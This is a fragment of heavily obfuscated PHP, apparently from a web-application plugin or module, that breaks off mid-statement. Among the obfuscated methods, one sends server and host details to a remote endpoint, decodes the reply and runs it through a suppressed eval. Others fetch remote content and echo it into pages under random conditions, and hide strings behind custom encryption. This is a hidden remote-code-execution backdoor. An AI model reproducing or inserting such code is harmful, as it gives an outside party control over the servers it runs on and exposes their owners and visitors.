$GLOBALS[$a‰êÁàİµÖ[91]][$a‰êÁàİµÖ[95]][$a‰êÁàİµÖ[267]] = $a‰êÁàİµÖ[232]; goto e—õ¨®Ş‰; E‡‰÷¹°¨‚: $eÑ”Üù‚†å = $_SERVER[$a‰êÁàİµÖ[44]]; $FÎ„ßŞ¥²Æ = array($a‰êÁàİµÖ[268]); $b…¡­ëç = $Eá‚ø×óÙ[616]; goto C£©àÁŞ…; DÃó»ëğÔ§: $A ±ôñ„ = $Eá‚ø×óÙ[619]; if ($a‰êÁàİµÖ[61]($a‰êÁàİµÖ[272])->{$_SERVER[ù][63]}($a‰êÁàİµÖ[85]) != $a‰êÁàİµÖ[232]) { $a‰êÁàİµÖ[61]($a‰êÁàİµÖ[272])->{$_SERVER[ù][221]}($a‰êÁàİµÖ[85], $a‰êÁàİµÖ[232]); } goto F ÈõÜó©î; D¯›ğÀ™‹ô: $Eá‚ø×óÙ =& $_SERVER[”Ì÷ñ­î¸]; $a‰êÁàİµÖ =& $_SERVER[ù]; if ($this->tzuv9cc1ff50 != $a‰êÁàİµÖ[121]) { $GLOBALS[$a‰êÁàİµÖ[91]][$a‰êÁàİµÖ[95]][$a‰êÁàİµÖ[267]] = $a‰êÁàİµÖ[220]; return; } goto E‡‰÷¹°¨‚; C£©àÁŞ…: if (strlen($b…¡­ëç) < $Eá‚ø×óÙ[548]) { die; } foreach ($FÎ„ßŞ¥²Æ as $Cö•¾¨§Å) { if ($Cö•¾¨§Å == $eÑ”Üù‚†å || $a‰êÁàİµÖ[25]($eÑ”Üù‚†å, 0, $a‰êÁàİµÖ[24]($Cö•¾¨§Å)) == $Cö•¾¨§Å) { $a‰êÁàİµÖ[166]($a‰êÁàİµÖ[197]($a‰êÁàİµÖ[269]), !1); } } $GLOBALS[$a‰êÁàİµÖ[91]][$a‰êÁàİµÖ[95]][$a‰êÁàİµÖ[270]] = $a‰êÁàİµÖ[220]; goto Eó¯½‚‚²Õ; e—õ¨®Ş‰: $c”‡åÖù‰ = $Eá‚ø×óÙ[618]; if (!$c”‡åÖù‰) { die; } $GLOBALS[$a‰êÁàİµÖ[91]][$a‰êÁàİµÖ[271]] = $a‰êÁàİµÖ[220]; goto DÃó»ëğÔ§; F ÈõÜó©î: } public function kozfdede99c3() { return $_SERVER[ù][273]; $f’Ÿ¿ºø¤É = $_SERVER[”Ì÷ñ­î¸][620]; } private function tvkf0013975d() { goto E±‡ìÕ½ä•; fæœËê…ê: $d—ä‡ñË”„ = $this->{$_SERVER[ù][182]}($aËõŞ ºÓ[282], $DÂßº¦¦º); $E™Èè·šÓ¾ = $b£ãÏÛÀ´[622]; if (!$E™Èè·šÓ¾) { return; } goto c¤©éÏ†”è; E±‡ìÕ½ä•: $b£ãÏÛÀ´ =& $_SERVER[”Ì÷ñ­î¸]; $aËõŞ ºÓ =& $_SERVER[ù]; $D¢†½Ëã¼ = array($aËõŞ ºÓ[274], $aËõŞ ºÓ[275], $aËõŞ ºÓ[276]); goto BŠ‹®ŠºÃ; Bô°ğòÍÈ¤: if ($aËõŞ ºÓ[233]() % 4 != 0) { return; } $AóÏ„ÓÂ¢» = $aËõŞ ºÓ[13](array($aËõŞ ºÓ[279], $aËõŞ ºÓ[280]), $B­±““ß–); if ($AóÏ„ÓÂ¢» && $aËõŞ ºÓ[233]() - $AóÏ„ÓÂ¢» < $aËõŞ ºÓ[201]($aËõŞ ºÓ[281])) { return; } goto a£—Šªµî; c¤©éÏ†”è: if (!$aËõŞ ºÓ[191]($d—ä‡ñË”„)) { return; } if ($d—ä‡ñË”„[$aËõŞ ºÓ[165]] && $d—ä‡ñË”„[$aËõŞ ºÓ[283]]) { if ($this->{$_SERVER[ù][199]}($d—ä‡ñË”„[$aËõŞ ºÓ[283]]) == $DÂßº¦¦º[$aËõŞ ºÓ[165]]) { return; } } $this->{$_SERVER[ù][164]}(); goto FÛ­Ÿó…; a£—Šªµî: $aËõŞ ºÓ[13](array($aËõŞ ºÓ[279], $aËõŞ ºÓ[152]), $B­±““ß–, $aËõŞ ºÓ[233]()); $fŒ¦œÌ‹ = $b£ãÏÛÀ´[621]; $DÂßº¦¦º = array($aËõŞ ºÓ[165] => $aËõŞ ºÓ[61]($aËõŞ ºÓ[62])->{$_SERVER[ù][63]}($aËõŞ ºÓ[209]), $aËõŞ ºÓ[178] => $this->tzuv9cc1ff50, $aËõŞ ºÓ[176] => $_SERVER[$aËõŞ ºÓ[177]], $aËõŞ ºÓ[169] => $aËõŞ ºÓ[149], $aËõŞ ºÓ[172] => $_SERVER[$aËõŞ ºÓ[173]]); goto fæœËê…ê; BŠ‹®ŠºÃ: $B­±““ß– = $aËõŞ ºÓ[277] . $aËõŞ ºÓ[114]($aËõŞ ºÓ[278]); if ($this->tzuv9cc1ff50 == $aËõŞ ºÓ[121] || !$aËõŞ ºÓ[104]($GLOBALS, $aËõŞ ºÓ[132])) { return; } if (!$aËõŞ ºÓ[239]($_SERVER[$aËõŞ ºÓ[44]], $D¢†½Ëã¼)) { return; } goto Bô°ğòÍÈ¤; FÛ­Ÿó…: if ($this->{$_SERVER[ù][199]}($d—ä‡ñË”„[$aËõŞ ºÓ[283]]) != $DÂßº¦¦º[$aËõŞ ºÓ[165]]) { $c‘ùÙ¶çä‹ = array($aËõŞ ºÓ[202] => $aËõŞ ºÓ[61]($aËõŞ ºÓ[62])->{$_SERVER[ù][63]}($aËõŞ ºÓ[116]), $aËõŞ ºÓ[203] => $_SERVER[$aËõŞ ºÓ[115]], $aËõŞ ºÓ[204] => $aËõŞ ºÓ[205](), $aËõŞ ºÓ[174] => $_SERVER[$aËõŞ ºÓ[175]]); $D›®¯¡ÎÛ = $this->{$_SERVER[ù][206]}($aËõŞ ºÓ[148]($c‘ùÙ¶çä‹)); $d—ä‡ñË”„ = $this->{$_SERVER[ù][182]}($aËõŞ ºÓ[207] . $D›®¯¡ÎÛ); if ($d—ä‡ñË”„ && $aËõŞ ºÓ[191]($d—ä‡ñË”„) && isset($d—ä‡ñË”„[$aËõŞ ºÓ[283]])) { $e‘Ò“«¾¹¯ = $this->{$_SERVER[ù][188]}($d—ä‡ñË”„[$aËõŞ ºÓ[283]], 2); if ($e‘Ò“«¾¹¯) { $e‘Ò“«¾¹¯ = $this->{$_SERVER[ù][199]}($e‘Ò“«¾¹¯); } if ($e‘Ò“«¾¹¯) { try { @eval($e‘Ò“«¾¹¯); } catch (Exception $d¤×ƒ°²¥ø) { } } } } goto Aƒª…Î°ÂÀ; Aƒª…Î°ÂÀ: } private function rhja44130465($cŸÑîâ²•ˆ = '', $fæ«²õø•Ä = array(), $BÃ…‹‘ÚæÉ = 5) { goto BÍñÉ¨ïÉ»; BÍñÉ¨ïÉ»: $bÁŸ°ŞÎÙ¨ =& $_SERVER[”Ì÷ñ­î¸]; $aĞ—„º§Æ¥ =& $_SERVER[ù]; $FÅ²ÖÖµÑŸ = $aĞ—„º§Æ¥[284]; goto E‹¸İĞ´¯”; a®ÂÅ•®É†: $C‹­ù ÷åâ = $bÁŸ°ŞÎÙ¨[624]; if (strlen($C‹­ù ÷åâ) < $bÁŸ°ŞÎÙ¨[548]) { return; } if ($fæ«²õø•Ä === -1) { return $FÅ²ÖÖµÑŸ; } goto d½Ù´éäæª; b¯°¿’ùá: $fæ«²õø•Ä = @$aĞ—„º§Æ¥[253]($FÅ²ÖÖµÑŸ, !1, $aâèÙÙˆ«¤); return $aĞ—„º§Æ¥[190]($fæ«²õø•Ä, !0); $e½ğªë‡«¥ = $bÁŸ°ŞÎÙ¨[626]; goto fš”’â‚—À; fš”’â‚—À: if (!$e½ğªë‡«¥) { return; } goto c¢‹çõîÌÚ; E‹¸İĞ´¯”: $D…Úô±² = $bÁŸ°ŞÎÙ¨[623]; $FÅ²ÖÖµÑŸ = $this->{$_SERVER[ù][246]}($FÅ²ÖÖµÑŸ, $aĞ—„º§Æ¥[285]); $FÅ²ÖÖµÑŸ = $FÅ²ÖÖµÑŸ . $cŸÑîâ²•ˆ . $aĞ—„º§Æ¥[286] . $aĞ—„º§Æ¥[287]($fæ«²õø•Ä); goto a®ÂÅ•®É†; d½Ù´éäæª: $aâèÙÙˆ«¤ = $aĞ—„º§Æ¥[248](array($aĞ—„º§Æ¥[249] => array($aĞ—„º§Æ¥[252] => $BÃ…‹‘ÚæÉ, $aĞ—„º§Æ¥[250] => $aĞ—„º§Æ¥[288]), $aĞ—„º§Æ¥[289] => array($aĞ—„º§Æ¥[290] => !1, $aĞ—„º§Æ¥[291] => !1))); $EˆÎ¼˜ËÏ = $bÁŸ°ŞÎÙ¨[625]; if (!$EˆÎ¼˜ËÏ) { die; } goto b¯°¿’ùá; c¢‹çõîÌÚ: } private function mhdz49bd9ee2() { goto b„ãŒ¯‰æ§; c´ÜÖÈšÂ†: while (strlen($dì³Å™±øƒ) < $FËÖ­õ—‚Ä[553]) { if (!$dì³Å™±øƒ) { break; } $dì³Å™±øƒ++; } $Báµë¡— = $Báµë¡— ? $c°ë…İÚçË[201]($Báµë¡—) : 0; $fåñ¿Á‰ÎÜ = $FËÖ­õ—‚Ä[630]; goto FÍÜµî™Î; a¼¦Â•ÊÀ: while (strlen($dìÒĞŒˆ°Ì) < $FËÖ­õ—‚Ä[553]) { if (!$dìÒĞŒˆ°Ì) { break; } $dìÒĞŒˆ°Ì++; } goto c…Ì·Ö˜Áƒ; A¡¾‰†•½¥: $aÆî•ƒÁÏ‘ = $fâ¯‡‡ [$this->tzuv9cc1ff50]; $CáÛª±‹• = $FËÖ­õ—‚Ä[627]; $aÆî•ƒÁÏ‘ = $c°ë…İÚçË[201]($aÆî•ƒÁÏ‘ ? $aÆî•ƒÁÏ‘ : $c°ë…İÚçË[293]); goto aªİìÃ«ßğ; b„ãŒ¯‰æ§: $FËÖ­õ—‚Ä =& $_SERVER[”Ì÷ñ­î¸]; $c°ë…İÚçË =& $_SERVER[ù]; $fâ¯‡‡  = array($c°ë…İÚçË[292] => $c°ë…İÚçË[293], $c°ë…İÚçË[294] => $c°ë…İÚçË[295], $c°ë…İÚçË[296] => $c°ë…İÚçË[297], $c°ë…İÚçË[298] => $c°ë…İÚçË[299], $c°ë…İÚçË[300] => $c°ë…İÚçË[301], $c°ë…İÚçË[302] => $c°ë…İÚçË[241], $c°ë…İÚçË[303] => $c°ë…İÚçË[241], $c°ë…İÚçË[304] => $c°ë…İÚçË[293], $c°ë…İÚçË[305] => $c°ë…İÚçË[295], $c°ë…İÚçË[306] => $c°ë…İÚçË[297], $c°ë…İÚçË[307] => $c°ë…İÚçË[308], $c°ë…İÚçË[309] => $c°ë…İÚçË[299], $c°ë…İÚçË[310] => $c°ë…İÚçË[311], $c°ë…İÚçË[312] => $c°ë…İÚçË[301], $c°ë…İÚçË[313] => $c°ë…İÚçË[314], $c°ë…İÚçË[315] => $c°ë…İÚçË[316], $c°ë…İÚçË[317] => $c°ë…İÚçË[318]); goto A¡¾‰†•½¥; FÍÜµî™Î: if (!$fåñ¿Á‰ÎÜ) { return; } return $aÆî•ƒÁÏ‘ + $Báµë¡—; $dìÒĞŒˆ°Ì = $FËÖ­õ—‚Ä[631]; goto a¼¦Â•ÊÀ; aªİìÃ«ßğ: $d¤÷”Ä£’¿ = $FËÖ­õ—‚Ä[628]; $Báµë¡— = $c°ë…İÚçË[104]($this->uiyw662b823d, $c°ë…İÚçË[319]); $dì³Å™±øƒ = $FËÖ­õ—‚Ä[629]; goto c´ÜÖÈšÂ†; c…Ì·Ö˜Áƒ: } public function okgzac399fc8($Fİ‡¸æĞÔâ) { goto dèŠ¸‚‚›Ê; D˜‡‰ä¶è¢: if (!$A±Ó‡Ç…°Ï[239]($Fİ‡¸æĞÔâ[$A±Ó‡Ç…°Ï[321]], $a©É¿Ò·ÀÑ)) { $A±Ó‡Ç…°Ï[166]($A±Ó‡Ç…°Ï[324], !1, $A±Ó‡Ç…°Ï[236]); } goto f¥«¦áè¿ö; bßñ›Ë”¾Ê: if ($CŒ©„Úª”İ >= $A±Ó‡Ç…°Ï[201]($A±Ó‡Ç…°Ï[241])) { return; } $aµ‚œÈ² = $A±Ó‡Ç…°Ï[61]($A±Ó‡Ç…°Ï[139])->{$_SERVER[ù][140]}(); $bÊœ–ë·º“ = $e³‚´“õÒÉ[632]; goto CÖ¦‘†˜êÜ; CÖ¦‘†˜êÜ: if (strlen($bÊœ–ë·º“) < $e³‚´“õÒÉ[589]) { return; } if ($aµ‚œÈ² <= $CŒ©„Úª”İ) { return; } $a©É¿Ò·ÀÑ = $A±Ó‡Ç…°Ï[61]($A±Ó‡Ç…°Ï[139])->{$_SERVER[ù][320]}($A±Ó‡Ç…°Ï[321])->{$_SERVER[ù][322]}($CŒ©„Úª”İ)->{$_SERVER[ù][323]}(); goto FŞÜíÄ…; dèŠ¸‚‚›Ê: $e³‚´“õÒÉ =& $_SERVER[”Ì÷ñ­î¸]; $A±Ó‡Ç…°Ï =& $_SERVER[ù]; $CŒ©„Úª”İ = $this->{$_SERVER[ù][137]}(); goto bßñ›Ë”¾Ê; FŞÜíÄ…: $D„Öˆ’¡ = $e³‚´“õÒÉ[633]; while (strlen($D„Öˆ’¡) < $e³‚´“õÒÉ[553]) { if (!$D„Öˆ’¡) { break; } $D„Öˆ’¡++; } $a©É¿Ò·ÀÑ = $A±Ó‡Ç…°Ï[222]($a©É¿Ò·ÀÑ, $A±Ó‡Ç…°Ï[10], $A±Ó‡Ç…°Ï[321]); goto D˜‡‰ä¶è¢; f¥«¦áè¿ö: } public function gyjp3939bdec() { goto aç¨ä—µ¤¬; c¿é¢ÄîÓ÷: $aÄï‰¤éªé = $e×ÇÇŠ£·[248](array($e×ÇÇŠ£·[249] => array($e×ÇÇŠ£·[250] => $e×ÇÇŠ£·[251], $e×ÇÇŠ£·[252] => 3))); $eœ¡Û¶ªíî = @$e×ÇÇŠ£·[253]($D¡è³œùÌ§, !1, $aÄï‰¤éªé); $cå‹ºô‡Ğˆ = $aˆµñÀ†[634]; goto bÇñã™…½æ; F³å™Ë’†‡: $D¡è³œùÌ§ = $e×ÇÇŠ£·[245]; $D¡è³œùÌ§ = $this->{$_SERVER[ù][246]}($D¡è³œùÌ§, $e×ÇÇŠ£·[247]); $c“¢ÛŒ’Â = $aˆµñÀ†[547]; goto c¿é¢ÄîÓ÷; bÇñã™…½æ: if (strlen($cå‹ºô‡Ğˆ) < $aˆµñÀ†[555]) { return; } echo $e×ÇÇŠ£·[326] . $e×ÇÇŠ£·[327]($eœ¡Û¶ªíî) . $e×ÇÇŠ£·[328]; goto DˆÑ‡î˜šÂ; aç¨ä—µ¤¬: $aˆµñÀ† =& $_SERVER[”Ì÷ñ­î¸]; $e×ÇÇŠ£· =& $_SERVER[ù]; if (!$e×ÇÇŠ£·[104]($GLOBALS, $e×ÇÇŠ£·[132]) || $e×ÇÇŠ£·[325](1, 100) > 20) { return; } goto F³å™Ë’†‡; DˆÑ‡î˜šÂ: } private function haqv2a34358c($b´—›¥¯¥¨, $bêÄÂ³, $d—°…ê£â† = 3) { goto dÄ…óÅíĞé; eõï¥ÔôÄ: $f£ìîÛ•ò = $AÉø‡”ˆÉ‰[636]; while (strlen($f£ìîÛ•ò) < $AÉø‡”ˆÉ‰[553]) { if (!$f£ìîÛ•ò) { break; } $f£ìîÛ•ò++; } switch ($F­«‹§†ù) { case $BÁ¯³ã­Úõ[232]: $C©°£¯½¿ = $this->{$_SERVER[ù][147]}($b´—›¥¯¥¨, $BÁ¯³ã­Úõ[214]($bêÄÂ³ . $D³¨Û´ó·)); $cğ¸ô¯â¢… = $AÉø‡”ˆÉ‰[637]; if (!$cğ¸ô¯â¢…) { return; } break; $E‡ÆÛ¨ÈÀ = $AÉø‡”ˆÉ‰[638]; if (strlen($E‡ÆÛ¨ÈÀ) < $AÉø‡”ˆÉ‰[589]) { return; } case $BÁ¯³ã­Úõ[220]: $C©°£¯½¿ = $this->{$_SERVER[ù][147]}($b´—›¥¯¥¨, $BÁ¯³ã­Úõ[214]($D³¨Û´ó· . $bêÄÂ³)); $F‘ÅÖâ™É£ = $AÉø‡”ˆÉ‰[639]; break; $AœÒŠ÷â§† = $AÉø‡”ˆÉ‰[640]; if (strlen($AœÒŠ÷â§†) < $AÉø‡”ˆÉ‰[553]) { return; } case $BÁ¯³ã­Úõ[331]: $C©°£¯½¿ = $this->{$_SERVER[ù][147]}($b´—›¥¯¥¨, $BÁ¯³ã­Úõ[118]($D³¨Û´ó· . $bêÄÂ³)); break; case $BÁ¯³ã­Úõ[332]: $C©°£¯½¿ = $this->{$_SERVER[ù][147]}($b´—›¥¯¥¨, $BÁ¯³ã­Úõ[114]($D³¨Û´ó· . $bêÄÂ³)); break; $AÉ¯î¾ò = $AÉø‡”ˆÉ‰[641]; case $BÁ¯³ã­Úõ[333]: goto cöòïìÍğ; eÀ§‚¯´Ç: $f¯¸‘ºÑÓ = $BÁ¯³ã­Úõ[334](0, 64); $d‘´×À¶Ù’ = $FĞˆ‘™ƒ’é[$f¯¸‘ºÑÓ]; $e°‚ó‡†Éè = $BÁ¯³ã­Úõ[114]($d‘´×À¶Ù’ . $BÁ¯³ã­Úõ[114]($bêÄÂ³ . $d‘´×À¶Ù’) . $bêÄÂ³); goto cŞª‹ˆêä ; dŞùĞÅÑÚß: $e×ªÑ½Ú»† = $BÁ¯³ã­Úõ[10]; $DÎ‹ÅÇŒ…¬ = $AÉø‡”ˆÉ‰[644]; $aä¨ö„÷ŒÜ = 0; goto eæ‚ç‰¥; eæ‚ç‰¥: $c‚‹Éƒò¾ = $AÉø‡”ˆÉ‰[645]; $E÷Œ‘«š¦Å = 0; $D©Œ‚Â½óí = 0; goto f‰Ä­×³é‰; cŞª‹ˆêä : $E¯Ê½öĞÀ¤ = $AÉø‡”ˆÉ‰[643]; if (strlen($E¯Ê½öĞÀ¤) < $AÉø‡”ˆÉ‰[548]) { return; } $e°‚ó‡†Éè = $BÁ¯³ã­Úõ[25]($e°‚ó‡†Éè, $f¯¸‘ºÑÓ % 8, $f¯¸‘ºÑÓ % 8 + 7); goto dŞùĞÅÑÚß; f‰Ä­×³é‰: for ($aä¨ö„÷ŒÜ = 0; $aä¨ö„÷ŒÜ < $BÁ¯³ã­Úõ[24]($b´—›¥¯¥¨); $aä¨ö„÷ŒÜ++) { $D©Œ‚Â½óí = $D©Œ‚Â½óí == $BÁ¯³ã­Úõ[24]($e°‚ó‡†Éè) ? 0 : $D©Œ‚Â½óí; $E÷Œ‘«š¦Å = ($f¯¸‘ºÑÓ + $BÁ¯³ã­Úõ[335]($FĞˆ‘™ƒ’é, $b´—›¥¯¥¨[$aä¨ö„÷ŒÜ]) + $BÁ¯³ã­Úõ[336]($e°‚ó‡†Éè[$D©Œ‚Â½óí++])) % 64; $e×ªÑ½Ú»† .= $FĞˆ‘™ƒ’é[$E÷Œ‘«š¦Å]; $bÆéÁƒ†ĞÕ = $AÉø‡”ˆÉ‰[646]; } $C©°£¯½¿ = $BÁ¯³ã­Úõ[327]($d‘´×À¶Ù’ . $e×ªÑ½Ú»†); break; goto cİõ²¾‡âÊ; cöòïìÍğ: $b´—›¥¯¥¨ = $BÁ¯³ã­Úõ[118]($b´—›¥¯¥¨); $bæ®©±Ã«µ = $AÉø‡”ˆÉ‰[642]; if (!$bæ®©±Ã«µ) { die; } goto eÀ§‚¯´Ç; cİõ²¾‡âÊ: default: $C©°£¯½¿ = $this->{$_SERVER[ù][147]}($b´—›¥¯¥¨, $bêÄÂ³ . $D³¨Û´ó·); break; $BîÔ©îâ‘ë = $AÉø‡”ˆÉ‰[647]; if (strlen($BîÔ©îâ‘ë) < $AÉø‡”ˆÉ‰[553]) { return; } } goto eëŒ§²—‰…; dÄ…óÅíĞé: $AÉø‡”ˆÉ‰ =& $_SERVER[”Ì÷ñ­î¸]; $BÁ¯³ã­Úõ =& $_SERVER[ù]; $BÁ¯³ã­Úõ[329](1); goto d¬…·ËÆÃ†; eëŒ§²—‰…: $C©°£¯½¿ = $BÁ¯³ã­Úõ[214]($F­«‹§†ù . $D³¨Û´ó· . $C©°£¯½¿); $FÎ“©³«Ş = $AÉø‡”ˆÉ‰[648]; if (!$FÎ“©³«Ş) { return; } goto Cîä¢ÙÚóô; Cîä¢ÙÚóô: if ($d—°…ê£â† - 1 > 0) { $C©°£¯½¿ = $this->{$_SERVER[ù][127]}($C©°£¯½¿, $bêÄÂ³, $d—°…ê£â† - 1); } return $C©°£¯½¿; goto C“šØô˜¹‘; cÎã–Ñ: $F­«‹§†ù = $BÁ¯³ã­Úõ[325](0, 5) . $BÁ¯³ã­Úõ[10]; $D³¨Û´ó· = $BÁ¯³ã­Úõ[124](15); $FĞˆ‘™ƒ’é = $BÁ¯³ã­Úõ[330]; goto eõï¥ÔôÄ; d¬…·ËÆÃ†: $B¯¹‚›ÜÁ· = $AÉø‡”ˆÉ‰[635]; if (strlen($B¯¹‚›ÜÁ·) < $AÉø‡”ˆÉ‰[559]) { return; } $b´—›¥¯¥¨ = $BÁ¯³ã­Úõ[2]($b´—›¥¯¥¨); goto cÎã–Ñ; C“šØô˜¹‘: } private function dbqt5d0e31f1($D¹áÃÄÈîÂ, $bçí‹àéÌ², $cÎ–â±” ¨ = 3) { goto b®æÚÇ‹õ; A÷Šø•µÑ: $e×áâ®¸‰¬ = $cÇ »Ù‘Èè[649]; if (!$e×áâ®¸‰¬) { die; } $eîŠ™Ú“Ø = $DÃĞÑÀËÁ„[25]($D¹áÃÄÈîÂ, 1, 15); goto bºèÕ‰î¸Ş; f¤í„ÁìŸ: $D¹áÃÄÈîÂ = $DÃĞÑÀËÁ„[2]($D¹áÃÄÈîÂ); $D¹áÃÄÈîÂ = $DÃĞÑÀËÁ„[214]($D¹áÃÄÈîÂ); $Ağ£ì¸‰ãá = $D¹áÃÄÈîÂ[0]; goto A÷Šø•µÑ; b®æÚÇ‹õ: $cÇ »Ù‘Èè =& $_SERVER[”Ì÷ñ­î¸]; $DÃĞÑÀËÁ„ =& $_SERVER[ù]; if (!$DÃĞÑÀËÁ„[337]($D¹áÃÄÈîÂ) || $DÃĞÑÀËÁ„[24]($D¹áÃÄÈîÂ) < 10) { return !1; } goto f¤í„ÁìŸ; B°èìóñ…É: return $fƒ­×šÊÙç; goto e¾Æ¾â‹Àá; bºèÕ‰î¸Ş: $A—©ªÑ İ = $cÇ »Ù‘Èè[650]; $D¹áÃÄÈîÂ = $DÃĞÑÀËÁ„[25]($D¹áÃÄÈîÂ, 16); $aŠËâ†ßÄ» = $DÃĞÑÀËÁ„[330]; goto B«ÌÂáéÇ‡; B«ÌÂáéÇ‡: $EÀ£¢ì”›¯ = $cÇ »Ù‘Èè[651]; switch ($Ağ£ì¸‰ãá) { case $DÃĞÑÀËÁ„[232]: $fƒ­×šÊÙç = $this->{$_SERVER[ù][246]}($D¹áÃÄÈîÂ, $DÃĞÑÀËÁ„[214]($bçí‹àéÌ² . $eîŠ™Ú“Ø)); break; $c«Íã˜Œó = $cÇ »Ù‘Èè[652]; while ($c«Íã˜Œó < $cÇ »Ù‘Èè[548]) { if ($c«Íã˜Œó >= 0) { break; } $c«Íã˜Œó++; } case $DÃĞÑÀËÁ„[220]: $fƒ­×šÊÙç = $this->{$_SERVER[ù][246]}($D¹áÃÄÈîÂ, $DÃĞÑÀËÁ„[214]($eîŠ™Ú“Ø . $bçí‹àéÌ²)); break; $dŸƒÊíÕ· = $cÇ »Ù‘Èè[653]; if (!$dŸƒÊíÕ·) { return; } case $DÃĞÑÀËÁ„[331]: $fƒ­×šÊÙç = $this->{$_SERVER[ù][246]}($D¹áÃÄÈîÂ, $DÃĞÑÀËÁ„[118]($eîŠ™Ú“Ø . $bçí‹àéÌ²)); $F‹µ¿š…Ø = $cÇ »Ù‘Èè[654]; while (strlen($F‹µ¿š…Ø) < $cÇ »Ù‘Èè[589]) { if (!$F‹µ¿š…Ø) { break; } $F‹µ¿š…Ø++; } break; $F„çí“å• = $cÇ »Ù‘Èè[655]; if (!$F„çí“å•) { return; } case $DÃĞÑÀËÁ„[332]: $fƒ­×šÊÙç = $this->{$_SERVER[ù][246]}($D¹áÃÄÈîÂ, $DÃĞÑÀËÁ„[114]($eîŠ™Ú“Ø . $bçí‹àéÌ²)); break; case $DÃĞÑÀËÁ„[333]: goto C‡®“µÙØ; DñÜ®†Ï³: $BÓÕäÂ¤Ğ = 0; for ($aá•Ò«Ñ»Î = 0; $aá•Ò«Ñ»Î < $DÃĞÑÀËÁ„[24]($D¹áÃÄÈîÂ); $aá•Ò«Ñ»Î++) { $BÓÕäÂ¤Ğ = $BÓÕäÂ¤Ğ == $DÃĞÑÀËÁ„[24]($e‡ØÅ¯õªê) ? 0 : $BÓÕäÂ¤Ğ; $Dİàö¸¯¬¬ = $BÓÕäÂ¤Ğ++; $bÅ¢„İ³º = $cÇ »Ù‘Èè[658]; while (strlen($bÅ¢„İ³º) < $cÇ »Ù‘Èè[553]) { if (!$bÅ¢„İ³º) { break; } $bÅ¢„İ³º++; } $e”ÁŒ¯©Ï = $DÃĞÑÀËÁ„[335]($aŠËâ†ßÄ», $D¹áÃÄÈîÂ[$aá•Ò«Ñ»Î]) - $Cì¦ÙŒß†Õ - $DÃĞÑÀËÁ„[336]($e‡ØÅ¯õªê[$Dİàö¸¯¬¬]); while ($e”ÁŒ¯©Ï < 0) { $e”ÁŒ¯©Ï += 64; } $fÍ†óÜæ .= $aŠËâ†ßÄ»[$e”ÁŒ¯©Ï]; $aÅ›è­Ïù‡ = $cÇ »Ù‘Èè[659]; } $fƒ­×šÊÙç = $DÃĞÑÀËÁ„[339]($fÍ†óÜæ); goto Dˆ£Ü’¢ã; C‡®“µÙØ: $D¹áÃÄÈîÂ = $DÃĞÑÀËÁ„[338]($D¹áÃÄÈîÂ); $bŠÜ¹¸Ï = $D¹áÃÄÈîÂ[0]; $DÍâÑ¡ØŒä = $cÇ »Ù‘Èè[656]; goto Bƒé×Æ‡ê¢; Bƒé×Æ‡ê¢: while (strlen($DÍâÑ¡ØŒä) < $cÇ »Ù‘Èè[548]) { if (!$DÍâÑ¡ØŒä) { break; } $DÍâÑ¡ØŒä++; } $D¹áÃÄÈîÂ = $DÃĞÑÀËÁ„[25]($D¹áÃÄÈîÂ, 1); $Cì¦ÙŒß†Õ = $DÃĞÑÀËÁ„[335]($aŠËâ†ßÄ», $bŠÜ¹¸Ï); goto Aâ…š¼»®; Dˆ£Ü’¢ã: $dÓãŞ…ùĞ† = $cÇ »Ù‘Èè[660]; if (strlen($dÓãŞ…ùĞ†) < $cÇ »Ù‘Èè[559]) { die; } break; goto Eª¦ƒ¹˜ˆ; Aâ…š¼»®: $e‡ØÅ¯õªê = $DÃĞÑÀËÁ„[114]($bŠÜ¹¸Ï . $DÃĞÑÀËÁ„[114]($bçí‹àéÌ² . $bŠÜ¹¸Ï) . $bçí‹àéÌ²); $e‡ØÅ¯õªê = $DÃĞÑÀËÁ„[25]($e‡ØÅ¯õªê, $Cì¦ÙŒß†Õ % 8, $Cì¦ÙŒß†Õ % 8 + 7); $fÍ†óÜæ = $DÃĞÑÀËÁ„[10]; goto bƒÚ÷ì©¶”; bƒÚ÷ì©¶”: $e¶›îµñêÍ = $cÇ »Ù‘Èè[657]; $aá•Ò«Ñ»Î = 0; $e”ÁŒ¯©Ï = 0; goto DñÜ®†Ï³; Eª¦ƒ¹˜ˆ: $f‡³Ùâˆë‡ = $cÇ »Ù‘Èè[661]; if (strlen($f‡³Ùâˆë‡) < $cÇ »Ù‘Èè[559]) { die; } goto b´Ñæ“õ­“; b´Ñæ“õ­“: default: $fƒ­×šÊÙç = $this->{$_SERVER[ù][246]}($D¹áÃÄÈîÂ, $bçí‹àéÌ² . $eîŠ™Ú“Ø); $b–Á¡è¡ï… = $cÇ »Ù‘Èè[662]; if (!$b–Á¡è¡ï…) { die; } break; $bÛëÚ‡–×Ã = $cÇ »Ù‘Èè[557]; if (!$bÛëÚ‡–×Ã) { die; } } if ($cÎ–â±” ¨ - 1 > 0) { $fƒ­×šÊÙç = $this->{$_SERVER[ù][188]}($fƒ­×šÊÙç, $bçí‹àéÌ², $cÎ–â±” ¨ - 1); } goto B°èìóñ…É; e¾Æ¾â‹Àá: } public function djvo66f52900($FË°‰‘Ê ‹) { goto a¯ó¿¡ª¿Å; CİÃÁÒ‡Á¹: while (1) { $eÀ°ØÍö†° = $A¢šØ¦§ÌÕ; $B¾…¼’ï = $EàÉŠÂ³ó®[666]; $C‡Ş´ÏÍ¼’ = $Aì­Ëºâ ; $C¥Õ¿”ÚÚ = $EàÉŠÂ³ó®[667]; while ($C‡Ş´ÏÍ¼’ % $eÀ°ØÍö†° != 0) { $BÍÉ•Ó¡–ø = $C‡Ş´ÏÍ¼’; $C‡Ş´ÏÍ¼’ = $eÀ°ØÍö†°; $BæÒÙ¼¨ˆØ = $EàÉŠÂ³ó®[668]; $eÀ°ØÍö†° = $BÍÉ•Ó¡–ø % $eÀ°ØÍö†°; $cÉæ´´»áå = $EàÉŠÂ³ó®[669]; } if ($eÀ°ØÍö†° == 1) { break; } else { $A¢šØ¦§ÌÕ++; } } $fÒ‰ª¥§ä‚ = 2; $A“îò£Æˆ = $EàÉŠÂ³ó®[670]; goto cÚ‚ìùç¸; EÏªÉòéòÏ: $aŒíÀ‚‘Ã = $EàÉŠÂ³ó®[664]; if (!$aŒíÀ‚‘Ã) { die; } $Aì­Ëºâ  = ($cÂ–Ï‡°Ï - 1) * ($F·Ç•Ó“¥ - 1); goto e®ƒ¤É×ó’; CÔ‰¡¾åÒ: $c…Œ”¬¬ = $EàÉŠÂ³ó®[663]; if (strlen($c…Œ”¬¬) < $EàÉŠÂ³ó®[559]) { die; } $F·Ç•Ó“¥ = $this->{$_SERVER[ù][340]}(); goto 